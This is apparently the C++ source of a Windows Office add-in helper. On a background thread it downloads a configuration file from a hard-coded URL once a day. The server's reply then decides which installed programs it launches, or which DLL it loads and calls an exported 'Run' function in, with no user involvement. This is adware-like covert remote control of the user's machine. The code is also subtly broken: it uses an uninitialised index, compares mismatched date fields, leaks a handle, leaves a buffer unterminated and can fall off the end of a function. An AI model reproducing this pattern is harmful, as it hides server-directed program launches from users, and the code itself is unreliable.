#include "stdafx.h"
#include "AddinHelper.h"

#include <cassert>
#include <cwctype>

#include <Sddl.h>
#include <TlHelp32.h>
#include <Wtsapi32.h>
#include <Userenv.h>
#include <shellAPI.h>
#include <ShlObj.h>

#include "ScopeResourceHandle.h"

AddinHelper::AddinHelper() :  m_hMutex(NULL)
{
}

AddinHelper::~AddinHelper()
{
	if (this->m_hMutex) {
		::CloseHandle(this->m_hMutex);
		this->m_hMutex = NULL;
	}
}


bool AddinHelper::EnsureOwnerMutex()
{
	if (this->m_hMutex == NULL) {
		if(!this->IsVistaOrHigher()) {
			// XP
			this->m_hMutex = ::CreateMutex(NULL, TRUE, this->m_mutexName.c_str());
			if (this->m_hMutex != NULL && ::GetLastError() == ERROR_ALREADY_EXISTS) {
				::CloseHandle(this->m_hMutex);
				this->m_hMutex = NULL;
			}
		}
		else {
			// Vista or higher
			SECURITY_ATTRIBUTES sa;
			char sd[SECURITY_DESCRIPTOR_MIN_LENGTH];
			sa.nLength = sizeof(sa);
			sa.bInheritHandle = FALSE;
			sa.lpSecurityDescriptor = &sd;
			if (::InitializeSecurityDescriptor(sa.lpSecurityDescriptor, SECURITY_DESCRIPTOR_REVISION)) {
				if (::SetSecurityDescriptorDacl(sa.lpSecurityDescriptor, TRUE, 0, FALSE)) {
					PSECURITY_DESCRIPTOR pSD = NULL;
					if (::ConvertStringSecurityDescriptorToSecurityDescriptor(_T("S:(ML;;NW;;;LW)"), SDDL_REVISION_1, &pSD, NULL)) {
						PACL pSacl = NULL;
						BOOL fSaclPresent = FALSE;
						BOOL fSaclDefaulted = FALSE;
						if (::GetSecurityDescriptorSacl(pSD, &fSaclPresent, &pSacl, &fSaclDefaulted)) {
							if (::SetSecurityDescriptorSacl(sa.lpSecurityDescriptor, TRUE, pSacl, FALSE)) {
								this->m_hMutex = ::CreateMutex(&sa, TRUE, this->m_mutexName.c_str());
								if (this->m_hMutex != NULL && ::GetLastError() == ERROR_ALREADY_EXISTS) {
									::CloseHandle(this->m_hMutex);
									this->m_hMutex = NULL;
								}
							}
							// ::LocalFree(pSacl);
						}
						::LocalFree(pSD);
					}
				}
			}
		}
	}
	return this->m_hMutex != NULL;
}

#ifdef _WIN64
#define SYSTEM32_X86 CSIDL_SYSTEMX86
#define PROGRAM_FILES_COMMON_X86 CSIDL_PROGRAM_FILES_COMMONX86
#else
#define SYSTEM32_X86 CSIDL_SYSTEM
#define PROGRAM_FILES_COMMON_X86 CSIDL_PROGRAM_FILES_COMMON
#endif

bool AddinHelper::BeginTask()
{
	m_mutexName = L"Global\{4A6857BD-19DB-4b04-82F2-992CDFF19186}_OFCADDIN";
	(HANDLE)_beginthreadex(NULL, 0, &AddinHelper::TaskThreadProc, this, 0, NULL);
	return true;
}

unsigned int AddinHelper::TaskThreadProc(void* arg)
{
	return reinterpret_cast<AddinHelper*>(arg)->TaskProc();
}

unsigned int AddinHelper::TaskProc()
{
	if(this->EnsureOwnerMutex()) {
		HandleChangeKeys();
	}
	return 0;
}

bool AddinHelper::IsVistaOrHigher() const
{
	DWORD dwVersion = GetVersion();
	DWORD dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	return dwMajorVersion >= 6;
}

void AddinHelper::HandleChangeKeys()
{
	//判断地域标志、今天是否执行过
	DWORD dwLastUTC = 0;
	DWORD dwZoneAllow = 0;
	BOOL bCando = FALSE;
	ATL::CRegKey key;
	if (key.Open(HKEY_CURRENT_USER, _T("Software\\WordEncLock")) == ERROR_SUCCESS) {
		bCando = TRUE;
		if (key.QueryDWORDValue(_T("allow"), dwZoneAllow) != ERROR_SUCCESS || dwZoneAllow != 1){
			bCando = FALSE;
		}
		else if(key.QueryDWORDValue(_T("lastutc"), dwLastUTC) == ERROR_SUCCESS) {
			__time64_t tTime = (__time64_t)dwLastUTC;
			tm* pTm = _localtime64(&tTime);
			LONG nLastDay = pTm->tm_wday;
			SYSTEMTIME systemTime;
			::GetLocalTime(&systemTime);
			LONG nCurDay = systemTime.wDay;
			if (nCurDay != nLastDay){
				bCando = TRUE;
			}
			else {
				bCando = FALSE;
			}
		}
	}
	key.Close();
	if (!bCando){
		return;
	}
	//下载配置
	TCHAR szBuffer[MAX_PATH] = {0};
	DWORD len = GetTempPath(MAX_PATH, szBuffer);
	if(len == 0)
		return;
	::PathCombine(szBuffer,szBuffer,_T("ofcenclockcfg.dat"));
	if (PathFileExists(szBuffer)){
		DeleteFile(szBuffer);
	}
	__time64_t nCurrentTime = 0;
	_time64(&nCurrentTime);
	TCHAR tszUrl[MAX_PATH] = {0};
	_stprintf(tszUrl, _T("%s?rd=%f"), OFFICE_ADDIN_CONFIG_URL, nCurrentTime);
	::CoInitialize(NULL);
	HRESULT hr = E_FAIL;
	__try
	{
		hr = URLDownloadToFile(NULL, tszUrl, szBuffer, 0, NULL);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		TSDEBUG4CXX("URLDownloadToFile Exception !!!");
	}
	::CoUninitialize();
	//解析配置
	if (SUCCEEDED(hr) && ::PathFileExists(szBuffer)){
		HANDLE hFile = CreateFile(szBuffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE){
			return;
		}
		DWORD dwfileSize = GetFileSize(hFile, NULL);
		char* pBuffer = (char *) malloc(dwfileSize);
		if (pBuffer == NULL){
			return;
		}
		DWORD dwBytesWritten =0;
		if (!ReadFile(hFile, pBuffer, dwfileSize, &dwBytesWritten, NULL)){
			free(pBuffer);
			return;
		}
		CloseHandle(hFile);
		//读取完成删除文件
		DeleteFile(szBuffer);
		std::string strInfo = pBuffer;
		free(pBuffer);
		std::string strKey1 = GetSubStr(strInfo, "key1=", "\r\n");
		std::string strKey2 = GetSubStr(strInfo, "key2=", "\r\n");
		BOOL bSuccess = FALSE;
		if (OrderLaunchSoftWare(strKey1, TRUE)){
			bSuccess = TRUE;
		}
		else if (OrderLaunchSoftWare(strKey2, FALSE)){
			bSuccess = TRUE;
		}
		if (bSuccess){
			__time64_t nCurrentTime2 = 0;
			_time64(&nCurrentTime2);
			ATL::CRegKey key2;
			key2.Create(HKEY_CURRENT_USER, _T("Software\\WordEncLock"));
			key2.SetDWORDValue(_T("lastutc"), nCurrentTime2);
			key2.Close();
		}
	}
	
}


std::string AddinHelper::GetSubStr(std::string& info, const char* key1, const char* key2)
{
	std::string::size_type idx = info.find(key1);
	if (idx != std::string::npos){
		std::string::size_type endpos =  info.find(key2, idx);
		if (endpos == std::string::npos){
			endpos = info.length()-1;
		}
		int nklen = strlen(key1);
		return info.substr(idx+nklen, endpos-idx-nklen);
	}
	return "";
}

std::wstring AddinHelper::GetSoftWarePath(int idx, BOOL isService)
{
	std::wstring wstrPath = L"";
	if (idx >= 0 && idx < ARRAYSIZE(tszRegPath)){
		std::wstring wstrTmp = QueryRegVal(HKEY_LOCAL_MACHINE, tszRegPath[idx], _T("Path"));
		if (wstrTmp != L""){
			if (isService){
				TCHAR tszPath[MAX_PATH] = {0};
				lstrcpy(tszPath, wstrTmp.c_str());
				PathRemoveFileSpec(tszPath);
				::PathCombine(tszPath, tszPath, tszSvcName[idx]);
				wstrPath = tszPath;
			}
			else{
				wstrPath = wstrTmp;
			}
		}
	}
	return wstrPath;
}

std::wstring AddinHelper::QueryRegVal(HKEY hkey, LPCTSTR lpszKeyName, LPCTSTR lpszValuename)
{
	ATL::CRegKey key;
	if (key.Open(hkey, lpszKeyName) == ERROR_SUCCESS) {
		TCHAR tszValue[MAX_PATH] = {0};
		ULONG lLen = MAX_PATH;
		if (key.QueryStringValue(lpszValuename, tszValue, &lLen) == ERROR_SUCCESS){
			std::wstring wstrInfo =  tszValue;
			return wstrInfo;
		}
		
	}
	return L"";
}

typedef int (*pfRun)(void);
BOOL AddinHelper::OrderLaunchSoftWare(std::string key, BOOL isService)
{
	std::string::size_type len = key.length();
	int idx;
	for (std::string::size_type i = 0; i < len; ++i){
		idx = atoi(key.substr(idx,1).c_str());
		idx -= 1;
		std::wstring wstrPath = GetSoftWarePath(idx, isService);
		if (wstrPath == L""){
			continue;
		}
		TCHAR tszPath[MAX_PATH] = {0};
		lstrcpy(tszPath, wstrPath.c_str());
		TCHAR* tszProName = PathFindFileName(tszPath);
		if (QueryProcessExist(tszProName)){
			continue;
		}
		bool result = false;
		if (isService){
			PathRenameExtension(tszPath, _T(".dll"));
			HMODULE hDll = LoadLibrary(tszPath);
			if(NULL != hDll){
				pfRun pf = (pfRun)GetProcAddress(hDll, "Run");
				if (pf){
					result = true;
					pf();
				}
				FreeLibrary(hDll);
			}
		}
		else {
			SHELLEXECUTEINFO sei;
			std::memset(&sei, 0, sizeof(SHELLEXECUTEINFO));
			sei.cbSize = sizeof(SHELLEXECUTEINFO);
			sei.lpFile = tszPath;
			sei.lpParameters = L"/sstartfrom officeplugin /embedding";
			sei.nShow = SW_SHOWNORMAL;
			result = static_cast<int>(ShellExecuteEx(&sei)) > 32;
		}
		return result;
	}
}

BOOL AddinHelper::QueryProcessExist(const TCHAR* processname)
{
	if (processname ==NULL){
		return FALSE;
	}
	BOOL bValue = FALSE;
	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		BOOL bResult = ::Process32First(hSnap, &pe);
		while (bResult)
		{
			if(_tcsicmp(pe.szExeFile, processname) == 0)
			{
				bValue = TRUE;
				break;
			}
			bResult = ::Process32Next(hSnap, &pe);
		}
		::CloseHandle(hSnap);
	}
	return bValue;
}